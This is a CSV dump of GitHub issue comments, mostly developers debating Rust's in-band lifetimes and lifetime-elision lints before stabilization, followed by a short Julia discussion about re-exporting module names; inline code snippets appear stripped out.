rust/rust-lang/44524/406077432,44524,"This elision is pretty cool As it removes a clearly redundant copy of . It is a clear win, because there still is one copy in the , so clarity of the explicit relationship isn't lost. However, I feel that on function level the elision doesn't pull its weight. It seems inconsistent, because there's  without any  it belongs to. If these were variable declarations, it'd be change from to so the first case becomes obvious as it should, the second case is WTF. ",,False
rust/rust-lang/44524/406080576,44524,"You don't have an  if you are writing something like . Moreover,  can still be nested, so the provenance of a given  is still murky. However, that nesting is pretty rare so maybe it's an acceptable loss in code clarity. ",,False
rust/rust-lang/44524/406083390,44524,"Also, part of the motivation of these changes is to get people to stop naming every lifetime 'a or 'b. I think it's important that we explicitly encourage people to start using more meaningful lifetime names like 'foo/'inner/'impl/whatever alongside encouraging them to use in-band lifetimes, not only because that was part of the reason we did this in the first place, but also because better names would mitigate most of the legitimate disadvantages of in-band lifetimes. ",,False
rust/rust-lang/44524/406103475,44524,"Has this been effective at changing people's naming?  Have any of the crates using it decided to change the names from  because of it?  The example up thread doesn't seem to have done so   (Thank you for posting, @friend!) I look at that example (and the one below it) and don't think ""this is better"".  Nor do they seem like they'd be better with names that aren't just .  The former needs to put it on everything, so in a way seems like it wants a different elision rule that gives all the arguments the same lifetime as the output, and any longer name would just be noisy.  The latter really wants lifetime-of-named-argument, since using a longer name feels even more repetitive on the argument .  Going to the return just being  would be helpful, but overall a change from  to  feels overall just ""meh"" to me. (I do really like that  let this change from  to just , but that's not in-band lifetime declarations, more like an expansion of elision.) ",,False
rust/rust-lang/44524/406111233,44524,"Is there talk of stabilizing that usage of ? (I know there is another part of , where you'll be required to change things like  to .) It sounds like that's being left out of the current FCP. ",,False
rust/rust-lang/44524/406134674,44524,"It seems like what's missing is a way of visually distinguishing local in-band lifetimes from outer lifetimes. Suppose we allowed lifetimes to be declared with two apostrophes  (semantically equivalent to ). We could then make it bad style to declare local lifetimes with a double apostrophe or something like that. Alternately, we could make it convention to name locals with a  prefix or some other naming convention we can lint on. ",,False
rust/rust-lang/44524/406262739,44524,Found a bug with this feature that IMO should block stabilization ,,False
rust/rust-lang/44524/406377343,44524,@friend concern lint This should not be stabilized until we have the lint that ensures a simple typo doesn't become an undeclared single-use lifetime. ,,False
rust/rust-lang/44524/406398444,44524,"I've written up my experience migrating  to the new system here. It's a rather long post -- however, I've tried to summarize my general feeling at the top. ",,False
rust/rust-lang/44524/406426194,44524,"Nice work! One quick response to the stuff about - the reasoning behind not eliding it (in e.g.  as opposed to the currently-allowed , without any  at all) was to align type-parameter lifetime elision with reference lifetime elision. It's supposed to play the same role as  in pointing out ""there's some lifetime here, but it comes from the usual elision rules."" The point about  looking like some special -like lifetime is worth considering, though- I don't know that it came up in the RFC thread. ",,False
rust/rust-lang/44524/406427449,44524,"Right, the point I was trying to make is that the &amp; already indicates that so any additional indication isn't required/helpful. ",,False
rust/rust-lang/44524/406429605,44524,"But the &amp; doesn't signify that. &amp;Mir doesn't tell you whether Mir has a lifetime parameter, and if it does, it might be &amp;'a Mir&lt;'a&gt; or &amp;'a Mir&lt;'b&gt;. I think that  is well-established as being irrelevant and unique in other parts of the language, like  and  so I'm not too concerned about ' being misinterpreted. What worries me more is the parts about losing context of where lifetime parameters are introduced. On Thu, Jul 19, 2018 at 600 PM, Mark Rousskov notifications@friend.com wrote ",,False
rust/rust-lang/44524/406886594,44524,"The following code compiles with the in-band lifetimes feature Now suppose that somebody wants to add the following function to the  block In order to do that, he/she may change  into , unaware that the impl block already contains a function that uses a lifetime named . The code then becomes Compilation fails with an error that points to a place that is unrelated to the change I would like to be able to add a lifetime parameter to an impl block without having to check manually if that would ""hijack"" a lifetime already used in a method in that impl block. This problem (and other problems related to not being able to tell at a glance where a given lifetime is comming from), may be mitigated by adding a lint-protected naming convention for lifetimes. If I am correct, there is currently no consensus on what that lint should do. If we stabilize this feature before we have such a consensus, we risk that this lint is never implemented (because we fail to reach consensus) and that problems like the one mentioned above will stay. I would like the team members to consider if this risk can be accepted before deciding on stabilization. ",,False
rust/rust-lang/44524/408140888,44524,@friend asked me to post the patch to librustc_mir as a PR; if you're interested feel free to leave comments on it (,,False
rust/rust-lang/44524/408456816,44524,"TL;DR I like everything about the lifetime syntax in Rust 2018, except named lifetimes coming ""out of thin air"" because they disrupt the flow of the reader. We should extend lifetime elision rather than elide lifetime declaration. Initially being a huge fan of in-band lifetimes, after using them I've come to believe that they're wrong solution for a problem worth solving. Lifetime elision, the first step in making lifetimes more ergonomic, was an elegant solution that eliminated something like 95% of lifetime declarations in functions. Then we got anonymous lifetimes in the form of , which I really like and find useful. The final step is eliding lifetime declarations, but I fear the drawbacks outweigh the benefits. The main drawback is that by reading a method signature it's not obvious where lifetimes come from. When reading code, in-band lifetimes disrupt my flow, which is the opposite of being ergonomic. My feeling is that instead of eliding lifetime declarations, we should extend lifetime elision. Let's consider an example Lifetimes  and  are simply noise so we can make them anonymous This is much better. Unimportant lifetimes are removed. And the fact that  and  were actually declared here tells us that they (probably) bind some references together. This is useful information when reading code, and it's not terribly annoying to type either. Here's another example that I recently used in  Lifetime  doesn't tie any references together (i.e. it's unimportant) so we can just make it anonymous This is still very readable (I'd say even more so) and quite a bit easier to type. Recently I've been fixing soundness issues in  due to incorrect lifetime bindings. Here's a corrected version of the declarations that used to be the problem There's a lot of stuff going on in here, but we can immediately see that  is declared here (used only in ), while  is coming from the  above. After fighting with very tricky bugs in this relatively small file, I appreciate explicit lifetime declarations very much (but only declarations of important lifetimes that tie references together). I'm also concerned about learnability. It has been argued that in-band lifetimes would help in the pre-rigorous stage of learning Rust. But I feel it's the opposite. Consider the following code If I were still learning lifetimes in Rust, my immediate question would be Is lifetime  in  and  the same lifetime? Answer no, unless both functions are inside an  that mentions . Another example My question would be Are types  and the  different? If the second function used , would the two  be the same type? It's confusing, IMO. But if  and  were assigned to these functions then it'd be clear that those lifetimes are only relevant to each specific function. Also,  signifies that lifetimes are inputs to the function. Input lifetimes and types go inside , while input values go inside . ",,False
rust/rust-lang/44524/408466368,44524,"Thanks, @friend!  Definitely nice to see more examples with pervasive lifetimes. @friend concern no lint suggesting underscore lifetimes (when in-band is off) This is very similar to  but I think my feeling is slightly different.  Most of the migrations I see have a bunch of changes that are actually about , making me think that we need more experience with only having that before taking the next step. As an example,  ♠diff impl&lt;'cx, 'cg, 'gcx, 'tcx&gt; ConstraintGeneration&lt;'cx, 'cg, 'gcx, 'tcx&gt; { impl ConstraintGeneration&lt;'cx, 'cg, 'gcx, 'tcx&gt; { ",,False
rust/rust-lang/44524/408482637,44524,"@friend concern in-band ambiguity From the discussion so far, it doesn't seem like anyone's made a strong case (practical evidence, or reasoned argument) addressing the numerous concerns both here and in the original RFC for the inability to identity in-band lifetimes versus parent lifetimes, and the learnability issues that poses. The current attitude seems to be ""let's add some lints to try to avoid common mistakes"", but I think an important question to ask might be ""If we need to add these lints in order to avoid common foot-guns, then is this really the right solution?"" The feeling I've got from reading people's experiences with in-band lifetimes is that they don't offer significant benefit compared to other lifetime convenience features, while opening up potential for confusing mistakes, especially for beginners. This also seems quite early to be pushing for stabilisation. The 2018 preview was announced a month ago and while the features have been available for longer, there wasn't a big push to get feedback until then. Since the RFC was implemented to see what the user experience was, it seems overly-eager to be saying that we have enough information now (at least, I've only seen a handful of more detailed feedback about the feature so far).  The lifetime elision in impls feature seems less dangerous, as the declaration of a lifetime is less ambiguous there, though it potentially has the same problem as in-band lifetimes if modules can ever be parameterised by lifetimes. ",,False
rust/rust-lang/44524/408504954,44524,"It seems to me that, while in-band lifetimes might look nice by analogy to OCaml/Haskell-style type variable syntax, the problems we're finding with them are largely due to the far greater use of nested parametric items in Rust. Further, the examples of the extended elision and  we're seeing already increase clarity and simplicity quite a bit. They may still have the  syntax to introduce the named lifetimes, but they can still remove it entirely in some cases and when it remains it helps combat the nesting ambiguity more effectively than a lint. So while in-band lifetimes still seem like a win to me in non-nested situations, that's probably not enough to warrant including them. ",,False
rust/rust-lang/44524/408514334,44524,"Back in the RFC thread some people (spoilers one of them was me) were arguing that  lifetimes and  lifetimes should use strictly disjoint sets of identifiers (e.g.  lifetimes are uppercase and  lifetimes lowercase, as was originally proposed) for greater clarity. (""Enforced"" by a lint, or whatever.) The official position at the time seemed to be that it wasn't clear if there was sufficient motivation. I think the comments above mine provide some. ",,False
rust/rust-lang/44524/408554096,44524,"I didn't get the impression that there was insufficient motivation- the lint was planned from very early on. AIUI the issue was rather which convention to pick, and whether it was sufficient. (For instance, I don't like upper/lowercase because it seems to imply qualitatively different sorts of entities, but the competing idea of single-character vs meaningful-name is less enforceable.) ",,False
rust/rust-lang/44524/409484229,44524,"After reading the post by @friend I'd prefer to not get this feature. I didn't realize it before, but in-band lifetimes are similar to implicit variable declarations (no ) which languages like CoffeeScript have. I think that explicit declarations are especially valuable when we have lengthy code. Lifetime declarations aren't bothersome to write but in nested situations they add the little bit of clarity that can be crucial to understand the code correctly or understand it faster because we can see precisely where each lifetime is introduced. ",,False
rust/rust-lang/44524/409657048,44524,"Despite my agreement that we may not want in-band lifetimes, I would like to push back against the idea (already discussed quite a bit earlier) that the problem is with ""implicit declaration"" per se, should the opportunity arise to consider this pattern elsewhere. It's primarily the nesting and shadowing that causes the problems here- without that, the situation is nearly identical to ML-style type declarations or Prolog-style patterns, which both a) are quite nice to use and b) fit well with the way lifetimes are used. ",,False
rust/rust-lang/44524/410306713,44524,"PR to split the feature gate between the named and elided parts  thing I noticed in passing, while I'm still skeptical overall, I really like this symmetry  I'm not sure how to turn that aesthetic feeling into a coherent proposal... ",,False
rust/rust-lang/44524/410415739,44524,"Hey, I would like to give you guys some feedback about this. I think the place I am most using lifetimes is in some LLVM wrappers from a project of mine (for self-learning purposes). Well, so far I had no problem on lifetimes, I mean, I haven't found bugs yet. I would like to say I really enjoyed the idea of making lifetimes look like ""annotations"" on the code. After all, that's what they really are. Correct me if I am wrong, but they are annotations of relationship between references (and structures containing references, etc.). The only concrete lifetime is . Also, generic code on references is not monomorphized as with regular types. I think makes sense having a different treatment.  I'm having some problem figuring out what thing deallocates what, so please, don't pay attention on code correctness. ",,False
rust/rust-lang/44524/410415926,44524,"But well, I see the discussion is inclining into not stabilizing in-band lifetimes. I have to agree about shadowing. Anyway, I just wanted to give some feedback. ",,False
rust/rust-lang/44524/412761829,44524,"FYI, I've P-FCP'd the non-in-band parts of this over in ",,False
rust/rust-lang/44524/413466932,44524,"Since it came up in reddit as well I'll mention one downside to the current idiom lint. It recommends using anonymous lifetimes on input types that are already behind references, for example on  This was a massive diff when I tried applying the idiom lints to  because it turned all the future implementations into The first  in  seems useful because it's non-obvious that  is a reference type. The second one in  seems superfluous because the  is already limiting the lifetime of the parameter to this function call. There may be cases where having an explicit parameter here is useful, but I don't think this case is as useful to lint against as most of the other cases this lint targets. (EDIT note I wrote the  implementation from memory, it was a while ago I tried running the lints against . I'm not certain that it actually added the lifetime to , but if it didn't that's just likely to be a bug in the interaction of the lint and arbitrary self types.) ",,False
rust/rust-lang/44524/414061107,44524,@friend I assume by your link you mean this version of  (now deleted)? You might like #52461 (which also made extensive use of in-band lifetimes). ,,False
rust/rust-lang/44524/414061176,44524,"@friend IMO the idiom lint shouldn't apply to  because it's ""a custom reference type"". (a library analogue of a sigil, if you will) ",,False
rust/rust-lang/44524/414062464,44524,"To me, lifetimes on input types that are not connected to anything are just noise We could rewrite @friend's examples in a similar fashion as Perhaps the lint should warn only of cases where hidden reborrows really are occurring and permit elision otherwise? ",,False
rust/rust-lang/44524/414063423,44524,"@friend I guess the condition you're after for that distinction is ""is this lifetime used in more than one place after elision?"" which should be really easy to check in the compiler! ",,False
rust/rust-lang/44524/414066057,44524,"@friend That's right. So the motivation for explicit lifetime parameters was (from the language ergonomics blog post) My thinking is that we should warn of elided lifetime parameters that participate in reborrowing, but not complain when they do not. ",,False
rust/rust-lang/44524/414069204,44524,"Minor nit I don't see why ""reborrowing"" is used in that blog post. This is just whether elision used the lifetime or not, I'd call it a ""lifetime relationship between input and output"", not ""reborrowing"". ",,False
rust/rust-lang/44524/414070061,44524,"@friend would you say the lint shouldn't apply to  or  either since they're fundamentally just custom reference types with extra invariants as well? If so, should the compiler be automatically recognising these types, or would it need some form of annotation? ",,False
rust/rust-lang/44524/414070304,44524,"@friend I now prefer @friend's interpretation, which is far more general. ",,False
rust/rust-lang/44524/414070558,44524,"Yes (I like that too), but it's orthogonal, there are still situations where  could fall under the the lint, e.g. in a signature like ",,False
rust/rust-lang/44524/414072257,44524,"@friend I that case it seems fine, if we're going for ""should be explicit because elision used it"" (I almost want to apply that rule to  too, since it should be less verbose and maybe worth it) (nevermind, one of the original goals of elision was to allow writing literally ). ",,False
rust/rust-lang/44524/414099895,44524,Perhaps  or some other attribute can be used to indicate that implicit lifetimes are ok? ,,False
rust/rust-lang/44524/414161953,44524,"I find the  example highly persuasive, and agree that seeing the lifetime there is unhelpful. So if I'm understanding things right, then the proposed rules would be  In output position, all lifetimes must be obvious (named, , or there because of ) In input position, only the lifetimes used in the output must be visible (at most one, if using elision)  (Hmm, I think that would also mean that things like  should work, without requiring  the way that  does.) ",,False
rust/rust-lang/44524/414406252,44524,"IMO, this is really weird and confusing.  should be unique every time, just like  in patterns. Why are we allowing it to be used to connect lifetimes? ",,False
rust/rust-lang/44524/414408142,44524,"Yeah,  is a bit confusing when first learning it. But as a general rule It behaves the same as elided lifetimes in references. So your example is akin to  where the lifetimes are obviously connected. ",,False
rust/rust-lang/44524/414409133,44524,"I still think that's harmful to understanding/learning. For example, let's say I read the chapter about elided lifetimes, and then I go write a match match (a, b, c) {     (, 2, ) =&gt; { println!(""a == c"") } // bug     ... } Why does  work differently here? It's inconsistent. Lifetime annotations are already ""a bit confusing when first learning"". If we're going to clutter up the syntax, it'd better be a vast improvement. On Mon, Aug 20, 2018 at 201 PM Christopher Serr notifications@friend.com wrote ",,False
rust/rust-lang/44524/414423109,44524,"@friend That ship has already sailed. The following is valid code in stable Rust now I don't think so;  is not necessarily unique in patterns. So  means ""something goes here, but I'm too lazy to give it a name"". That something might or might not be equal to something else. It just doesn't have a name, that's all. The same applies to anonymous lifetimes. And lifetime elision just means the compiler tries to infer the obvious relationships between input and output lifetimes whenever possible, or ask the programmer for help in ambiguous cases. ",,False
rust/rust-lang/44524/414663773,44524,"Hmm. I haven't had time to fully catch up on this thread. I feel wary, though, of giving up on the ""use  everywhere a lifetime would appear"" rule. I feel though that there is value in having the struct declaration () match up closely with references to the struct (). That said, if I recall I made similar arguments to @friend some time back, basically claiming that the most important thing was to highlight that there is some reference somewhere. I think somewhere along the line my opinion shifted, but maybe it can shift back. =) I think for me personally Having some sign that a reference has been elided in a return value is absolutely necessary. I am confused on a regular basis by things like the  that appears here in the compiler  an indication that ""lifetimes appear in this type"" in parameters feels helpful. I definitely scan parameter lists visually in order to get a feeling for whether I will be able to easily copy or move that value into a struct etc, or whether I can easily refactor away from  to . Knowing that  itself contains references makes a difference there. I know I've been tripped up by this before (thought I could do something that turned out not to work); I'm not sure how important it really is. Finally, it's a minor point, but having explicit  is really useful in error messages, since we can highlight that  and talk about it but we've already got some other solutions there (e.g., printing the type), since sometimes we don't have a type at all. ",,False
rust/rust-lang/44524/417705426,44524,"Can this issue perhaps be split into multiple ones? I'm not quite sure what exactly is tracked by it right now. The  and  looks good to me, but I never set my ticky box due to ""define-on-use"" for lifetimes, which are not aligned with fundamental priorities of the language as I see them. Those priorities include reliability of code and its resistance to accidental mistakes, which are especially important for large projects written and extended by many people often unfamiliar with code they are changing. For lifetimes such separation of def and use provides duplication necessary for error detection during  addition, removal and renaming of lifetimes in impls/traits, impl/trait items and perhaps lifetime-parameterized modules in the future. ",,False
rust/rust-lang/44524/417710234,44524,@friend I thought it was already split?  is already stabilized (#48469) and  is in #15872. ,,False
rust/rust-lang/44524/418228513,44524,"I propose we cancel this p-FCP for now.  It seems like it's de facto not landing for the edition.  We can wait to gain more experience with additional lifetime elision, as @friend suggested, before reconsidering it. A bunch of situation for  in libcore ",,False
rust/rust-lang/44524/418369954,44524,"@friend There are also types for which writing lifetimes in parameters is not that helpful      All these types are reference types by nature, so it's kind of obvious they contain lifetimes. No need to write them out. We could argue in the same vein that the lifetime in  is not helpful because we already know every reference contains a lifetime. But since  is just syntax sugar for , we could say that for other reference types it's obvious they contain lifetimes, too. Of course, with types like  it's not obvious they contain lifetimes unless we write them out. But I also never cared about  having a lifetime so the  will only be annoying to type. I admit that lifetimes in types do come up useful in some cases. But, personally, I feel that the drawback of verbosity outweighs the benefits. One of the things I first hated about Rust is that I had to parametrize structs by lifetimes if they contained references. Storing a reference inside a struct felt like a punishment I have to write so many lifetimes now, should I have used clone or  instead? I worry that requiring lifetimes will only make the punishment worse. And references should be encouraged, not discouraged. Also, my attitude towards lifetimes was generally (and still is) I'd like to elide lifetimes as often as possible, but I don't mind helping out in the rare cases where things require assistance. This is one of the cases where I feel like the compiler wants too much help (yes, it's only for the benefit of the reader, but still). ",,False
rust/rust-lang/44524/422197268,44524,@friend fcp cancel ,,False
rust/rust-lang/44524/422197809,44524,"@friend I wonder to what degree the problem here is just ""bad"" syntax -- the  is pretty unwieldy. As to whether it's obvious whether the types you mention contain references -- I think there are a lot of times where that's not the case, for example when you're working with an unfamiliar code base, or just don't happen to be thinking about that question and hence don't catch the borrowing implied by a signature. I personally do find a visual signal of some kind to be quite helpful, but am sad that we weren't able to find something more appealing and lightweight. ",,False
rust/rust-lang/44524/422212017,44524,"@friend That's the only problem really  is far more unwieldy than . We tried using  everywhere in  (see #53816), but I'm not sure the end result is great. Signatures like these are not pretty I appreciate the usefulness of explicit lifetimes here, but considering the verbosity they don't seem like a net win to me. YMMV, though. My main worry is that the proliferation of lifetimes will be a step back for ergonomics and that we might have to write lifetimes more often in Rust 2018 than in Rust 2015. I'm not sure if that's really true, but it'd surely be unfortunate. ",,False
rust/rust-lang/44524/422216179,44524,"I'm of two minds about this I personally think it's really helpful as a reader to be able to see which types have lifetimes in them, and I like seeing . However, I am scared that we're making lifetimes ""noisier"" which will have the potential to frustrate authors and make them use owned types instead in order to avoid sticking  everywhere. ",,False
rust/rust-lang/44524/422384048,44524,"I still think we should make the rule ""you have to only write out lifetimes (even just ) if they're used more than once"" (i.e. elision picks them up). Why? Because only then do they become lifetime relationships. Otherwise, the function is quite universally quantified over them, which is pretty boring. ",,False
rust/rust-lang/44524/422465451,44524,"@friend My concern with that approach is that there's another aspect of ergonomics at play being able to easily remember what is required where. To me, it seems much easier to remember that  always gets a lifetime than to use it only in select circumstances. While  is stable, for the 2018 Edition we could consider scaling back the lint, at least initially. I'd really love to hear from @friend here; he's been pretty outspoken about this in the  past. ",,False
rust/rust-lang/44524/422505328,44524,"I want to speak up in favor of having some signal that there are ""hidden lifetimes"" in types. The current notation of  is not my favorite, but I don't yet have a compelling alternative. What I find is that I am constantly wanting to know whether a type contains references or not. It tells me a lot about how the type can be used types without lifetimes can be cloned or copied and stored for arbitrary amounts of type. Types with lifetimes are always temporary in scope and confined to some caller (modulo longer lived arenas like  in the compiler, which are the exception, and also readily identifiable). In the specific case of a type that appears in the return value, I find it invaluable to know if there is an elided lifetime within, since it tells me how long the borrow on  will last. I suspect that I derive outsized value from this notation because my intuitions for this stuff are stronger than most (can't imagine why that might be). But I feel like having a consistent syntax that highlights where lifetimes are and where they are not might wind up being very important for helping other users to develop these annotations. OK, let me give a few examples that I've run across recently. Just yesterday I was reading into the futures code and I saw this Now, I know that a  is an accumulation of bits of state. But I inferred from this signature that this state must not have any references associated with it and hence must be owned by . This seemed surprising to me. But when I clicked through to the definition, I saw that I was mistaken, and that indeed the  type carries references  to make matters worse, rustdoc actually hides these references, so it's actually quite hard to figure out what is going on. Anyway, then I kept reading, and I encountered this signature Here, I was confused for quite a while, because I misremembered that  carried a ""hidden"" lifetime (in fact, it was ). I knew that somehow  was supposed to ""store away"" a copy of the , so that it could notify the executor when it should be rescheduled, but I couldn't figure out how that was possible, since  carried references. It took some time for me to realize that I has misremembered and that  does not have references, so you can clone it and not be tied to any active borrow. Another example comes from the rustc source, which for a long time contained a function like this It happens that  holds a reference into , so this borrow will last as long as the return value is in use. But could you guess that? This same principle applies to compiler error messages. There, it's quite nice that we have something we can highlight to show you which reference we are talking about. e.g., we can now give errors like this Here, I imagine that we can find other solutions (and in general I'd like to work on improving these messages in lots of ways), but in general having a visual signal for where references are will always be useful to us, I think. As far as consistency goes, I think there is value in trying to close the gap between the various ways that you write types in Rust. Right now, types that appear in function signatures and those that appear in struct declarations sometimes look really different (e.g.,  vs ). If we have , then there is at least a signal telling you ""when you put this into a struct, it's going to need lifetime parameters"". (I would still like to have some way to have a single anonymous lifetime parameter of a struct, so that one could write  as well, but that's neither here nor there.) ",,False
rust/rust-lang/44524/422506964,44524,"@friend I agree that this is not pretty, but I'm not sure that just a plan  is really better. I personally find it a bit ""surprising"" to see things like  without any parameters, since it is relatively unusual, and it makes my mind feel like something is missing. I suspect that for newcomers to rustc it might also be hard to remember what things have lifetimes and which do not, though it's hard for me to judge. Speaking personally, I find the  there ugly but I do find it serves a purpose. Without that, when I see , my mind pattern matches it with  or other such pointer types, and those two things are quite different. I think ultimately I agree with @friend's comment here ",,False
rust/rust-lang/44524/422510634,44524,"I should also add that I appreciate that typing  is kind of... challenging. It feels like the sort of thing where I want an IDE that, once I type , just fills in the  or something. ) ",,False
rust/rust-lang/44524/422516114,44524,"@friend Did I miss a part of your comments, or did you not address the specific suggestion of only requiring explicit  when there is an implicit relationship (i.e. when elision is involved)? The elision aspect would cover that. And IMO I find that far more interesting than being able to tell whether a type is parametrized when looking at an universal function. I'd rather have IDEs and  provide an expanded version on hover, than have to write in all the lifetimes even in signatures where they're inconsequential. ",,False
rust/rust-lang/44524/422518446,44524,"@friend I did not specifically address that. I agree that is better than the status quo. It might be a good place to start, given the controversy of the more encompassing proposal. However, I don't find this to be true That is to say, I personally get a lot of value from knowing whether types are parameterized when looking at universal functions. Often, when somebody pings me with some lifetime error and associated source, the first thing I do is to spend a while figuring out ""where the lifetimes are"". Currently, this requires jumping through to the source of all the various types involved. I agree though that there is a cost of heavier notation. ",,False
rust/rust-lang/44524/423182411,44524,"Is there a lint that warns against elided lifetimes in types (I mean everywhere, not just in return position)? I'd like to see how much of an effect that has on a few projects I'm familiar with -- and if it's not too bad, it might change my opinion. ",,False
rust/rust-lang/44524/423188838,44524,"@friend try , I think that still has the full behaviour ",,False
rust/rust-lang/44524/423191647,44524,"Or even  (although I don't know if that can affect dependencies, given 's ""cap lints""). ",,False
rust/rust-lang/44524/423228510,44524,"Ok, I've just run the lint on all the  crates, , , and . Here's what I learned... The vast majority of the reported warnings are either missing lifetimes in return position or in . There are only a few remaining cases where we need to add lifetimes but it's no big deal, honestly. I'm pleasantly surprised by the low impact of the lint. Still, the large PR (around 550 lines were changed) submitted on  was making me feel uneasy. I thought maybe the code in  is a particularly bad example that uses lifetimes heavily. Then I went on to calculate the ratio of warnings per total lines of code in those projects. Perhaps  has a higher ratio of warnings per total lines of code? It turns out it doesn't - the ratio is not significantly higher. It's just that  is really big. I think my opinion has changed so allow me to make a 180 turn and give a 👍 for requiring lifetimes in all types. If anyone else is feeling unconvinced, I encourage you to do the same thing and try to assess the real impact of the lint. ",,False
rust/rust-lang/44524/423234065,44524,"In  this results in 511 warnings (from 15028 lines of code according to tokei). Scanning the output I'm relatively confident that every single warning is for an input parameter that is not connected to the output in any way, so would result in no warning for the ""explicit lifetimes when elided"" variant. ",,False
rust/rust-lang/44524/423248835,44524,"To be fair,  is a bit of a special case because almost all warnings come from  and . And there's a whole lot of  impls in there, which you're not supposed to implement by yourself anyway. Besides,  will soon become , which cuts the number of warnings down from 511 to 216. ",,False
rust/rust-lang/44524/423286907,44524,"And  will become , fixing the remaining half (see ",,False
rust/rust-lang/44524/423728912,44524,Undeveloped thought (By analogy to  =&gt;  patterns.) ,,False
rust/rust-lang/44524/423805648,44524,"Hmm, this lint produces 1514 warnings on Servo's style component alone, and the fix looks a lot more verbose and ugly ( ",,False
rust/rust-lang/44524/423806488,44524,"Most of them are actually unused lifetimes, as in, there's no relation with them and the output of the function... I think @friend's approach of only warning when elision actually comes at play it's way better than the current warning, getting the usefulness without the annoyance. ",,False
rust/rust-lang/44524/423808916,44524,@friend I frankly disagree we need explicit lifetimes in that case. ,,False
rust/rust-lang/44524/425724525,44524,"Here's a related pet peeve of mine. Currently, this compiles But this doesn't Sometimes requiring  and sometimes not requiring it feels inconsistent. We should pick a side either require it or don't. ",,False
rust/rust-lang/44524/438918038,44524,"I wonder, would it be reasonable to stabilize only in-band lifetimes on functions (not methods)? AFAICT, there is no ambiguity about where those lifetimes come from, right? ",,False
rust/rust-lang/44524/438918526,44524,"To be clear, I mean that we would stabilize a useful subset now as long as it is future-compatible with the rest of in-band lifetimes. ",,False
rust/rust-lang/44524/439064046,44524,"I question whether partially adding such a feature simplifies anything, since even if one believes leaving out lifetime declarations is a good thing, we would actually be adding more rules about where that's allowed. And it still makes situations like the following harder to read. On Thu, Nov 15, 2018, 0003 Who? Me?! &lt;notifications@friend.com wrote ",,False
rust/rust-lang/44524/461235108,44524,"I came across this issue when converting my code to Rust 2018 edition. I have lots of code that elides lifetimes in parameters and the  tool suggested I make make changes to add explicit lifetime annotations. Consider the following Initial code My understanding is that omitting the lifetime parameters like that is deprecated and  rewrites  as However, then I generalized the initial code ( implements  so the generalized code really is strictly more general than the previous code) When I run , it doesn't make any lifetime annotations explicit in the generalized version; it leaves the code as-is. It seems really arbitrary to me to encourage the more generic code to elide the lifetime parameters but discourage the less generic code from doing so. In general, Rust programmers need to be able to understand generic code and that means that they'll need to understand that there are potentially unseen lifetimes arguments implicitly in play when a reference type is used as the concrete type in a generic context. I think encouraging explicit lifetimes in non-generic contexts is only going to make it harder for people to understand this. Also, over the course of maintaining my ""idiomatic"" code, I found that the unnecessary-but-idiomatic explicit lifetimes actually resulted in bugs. See  in particular. That bug wouldn't have occurred if I had used the old style of eliding the lifetime. Therefore, I think we shouldn't call the use of unnecessary (according to the compiler) explicit lifetimes ""idiomatic"". I hope this can be reconsidered before JetBrains CLion replaces its ""elide lifetimes"" quick-fix with what  does. ",,False
rust/rust-lang/44524/461324489,44524,"@friend The difference I see between those two is that  is already visibly generic and dependent upon a type argument that may have a non- lifetime. , on the other hand, has no visible parameters and so it may not be obvious that it could be non-. ",,False
rust/rust-lang/44524/461371064,44524,"Re- the new ""idiomatic"" way to write that signature is which makes it explicit that the passed  parameter has a lifetime, but that it is not involved in the output (same as  does semi-implicitly with the ). If  suggested to turn  into  there instead then that is a bug in the lint. ",,False
rust/rust-lang/44524/501923972,44524,"What's the situation wrt. ""implicit shadowing"", between implementation and desired behavior? I was expecting this to error Just like this does With such an error requiring , we reserve the right to inherit generic parameters (both  and ) in nested items, without existing code changing behavior. ",,False
rust/rust-lang/44524/501994478,44524,"The RFC says an error to mention lifetimes from that outer definition (without binding them explicitly). This is again intended for future-proofing and clarity, and is an edge case. Apparently this future-proofing wasn't implemented. ",,False
julia/JuliaLang/1986/9865041,1986,"It would be convenient if there were a way to do this. Doing this explicitly (copy the long list of exports from A into B) is a bit ugly and error prone. I imagine any alternative would involve a new keyword though. Concretely, Gadfly is useless without symbols from Compose (and probably DataFrames), but a bunch of compulsory using statements isn't great. ",,False
julia/JuliaLang/1986/12125581,1986,"Actually, I would propose altering export's semantics to make this work ",,False
julia/JuliaLang/1986/12125896,1986,This is a very good point. I've taken to doing  at the start of any new package code that has DataFrames as a requirement. ,,False
julia/JuliaLang/1986/22273052,1986,"My suggestion would be , which would re-export the exported names of  (but not the unexported names!). ",,False
julia/JuliaLang/1986/22273550,1986,"A potential downside is that it may make discovery of exported names a bit harder. Also, I'm disinclined to support reserving another name . So, alternatively, something like  perhaps? Or  (a module name followed by a period)? ",,False
julia/JuliaLang/1986/22273887,1986,"seems weird to me (and if you are willing to add a  keyword, why not ?), but  seems fine to me if a bit subtle. I don't understand your concern about discovery of exported names; could you clarify? ",,False
julia/JuliaLang/1986/22274563,1986,"Currently, it easy to parse any julia file, search for  at the start of an expression, and interpret the comma-separated list that follows to quickly identify the public interface for a module. ♠using ... as ... with reexportusing`, not a new keyword ",,False
julia/JuliaLang/1986/22276324,1986,"I see, you are worried about manually parsing for exports.  It's not too bad with , though—you just need to do the same thing recursively for each . If you are wedded to , I would tend to just support . ",,False
julia/JuliaLang/1986/22277284,1986,"I'm just tossing around other proposals for consideration. Very likely, none of them are inherently better. I didn't mean to imply the  part was required.  or  or  would all be valid. Whether this is a single word or a phrase depends on whether we want to be closer to a english sentence or a keyword. I could accept either. ",,False
julia/JuliaLang/1986/22279822,1986,I personally kind of like .  It's got a nice symmetry with . ,,False
julia/JuliaLang/1986/33334615,1986,I made a macro that mostly works for this pupose. I say mostly because relative module syntax does not work. The parser parses  as  and throws a syntax error on . ,,False
julia/JuliaLang/1986/33343580,1986,"If we ever get a resolution of this issue, we would be able to remove hundreds of lines' worth of redundant-seeming exports from Base.LinAlg and then again from Base. ",,False
julia/JuliaLang/1986/33758306,1986,"I'm with @friend, in that I find  most appealing. What's the downside to adding that as a keyword? ",,False
julia/JuliaLang/1986/33758686,1986,"What does  do if you haven't imported/used anything from A, e.g. Exporting bindings that are not accessible in  is not really an option, so does it throw, export only the  module and none of its exported symbols, or implicitly call  or ? Unless it does something implicitly, it is even more verbose than the alternatives, since you need two lines of code instead of one. And if it does something implicitly, then we are adding a fourth keyword that imports bindings. ",,False
julia/JuliaLang/1986/33758835,1986,"Throw an error.  Even though it's more verbose, I find it clearer and more natural than most of the proposed alternatives. ",,False
